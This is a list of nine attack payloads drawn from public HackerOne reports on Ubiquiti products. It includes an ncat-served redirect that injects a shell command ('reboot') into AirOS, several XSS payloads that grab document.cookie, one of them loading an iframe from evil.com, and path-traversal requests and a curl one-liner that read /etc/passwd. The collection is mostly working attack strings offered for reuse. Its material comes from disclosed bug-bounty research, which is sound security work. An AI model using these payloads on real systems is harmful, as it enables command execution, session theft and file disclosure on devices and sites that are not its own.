# Ubiquiti Inc.

9 payloads.

### `f58f68f8`

```
echo -en "HTTP/1.1 302 Found\r\nLocation: https://192.168.1.100/login.cgi `reboot`\r\nContent-Length: 0\r\n\r\n" | ncat -lp 8080
```

— [Read-Only user can execute arbitraty shell commands on AirOS](https://hackerone.com/reports/139398) · Ubiquiti Inc. · [rbran](https://hackerone.com/rbran)

### `cd9ae478`

```
Step 1: Login to target.com
Step 2: Connect latest unifi controller with target.com via cloud access.
Step 3: Create site with any name in that controller.
Step 4: Click on launch site in target.com then you will again redirect to target.com with controls.
Step 5: Create Network with xss payload "><img src=x onerror=prompt(document.cookie)>
Step 6: XSS will execute.
```

— [Stored XSS in target.com](https://hackerone.com/reports/142084) · Ubiquiti Inc. · [b7882330c6060c6b277c5a1](https://hackerone.com/b7882330c6060c6b277c5a1)

### `75f151b3`

```
http://172.98.67.89:22057/survey.cgi?iface=%22%3E%3Cimg%20src=x%20onerror=prompt(document.cookie
```

**Parameter:** `iface`
— [Reflected Xss in AirMax \[Nanostation Loco M2\]](https://hackerone.com/reports/149287) · Ubiquiti Inc. · [b7882330c6060c6b277c5a1](https://hackerone.com/b7882330c6060c6b277c5a1)

### `68998df4`

```
https://target.com/form.html?uid=1&p=%27%20onmouseover=alert(document.domain
```

**Parameter:** `p`
— [\[target.com\] DOM based XSS at form.html](https://hackerone.com/reports/158484) · Ubiquiti Inc. · [s_p_q_r](https://hackerone.com/s_p_q_r)

### `bbed1002`

```
http://target.com/xss?c=%3Cmeta%20http-equiv=%22X-UA-Compatible%22%20content=%22IE=9%22%3E%3Ciframe%20src=%27http://evil.com/github-btn.html?%23%26user=yrdy%3Cscript%3Ealert(document.domain);alert(document.cookie);//%26type=follow%27%3E%3C/iframe%3E
```

**Parameter:** `c`
— [\[target.com\] DOM Based XSS nuttyapp github-btn.html](https://hackerone.com/reports/200753) · Ubiquiti Inc. · [bobrov](https://hackerone.com/bobrov)

### `c4bbc333`

```
https://target.com/combine/;%3Cvideo%3E%3Csource%20onerror=%22javascript:alert(1
```

— [XSS](https://hackerone.com/reports/219170) · Ubiquiti Inc. · [linkks](https://hackerone.com/linkks)

### `a5ca22b6`

```
GET /..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd HTTP/1.1
Host: target.com
```

— [\[target.com\] Local File Reading](https://hackerone.com/reports/260420) · Ubiquiti Inc. · [bobrov](https://hackerone.com/bobrov)

### `47840a97`

```
curl "https://target.com/..\..\..\etc\passwd"
```

— [\[target.com\] Local File Reading](https://hackerone.com/reports/260420) · Ubiquiti Inc. · [bobrov](https://hackerone.com/bobrov)

### `6764a752`

```
"><IMG src=x onerror=prompt(1);>"">><marquee><img src=x onerror=confirm(3)></marquee>"/
```

— [Stored XSS in target.com In Client Custom Attribute ](https://hackerone.com/reports/275515) · Ubiquiti Inc. · [khizer47](https://hackerone.com/khizer47)
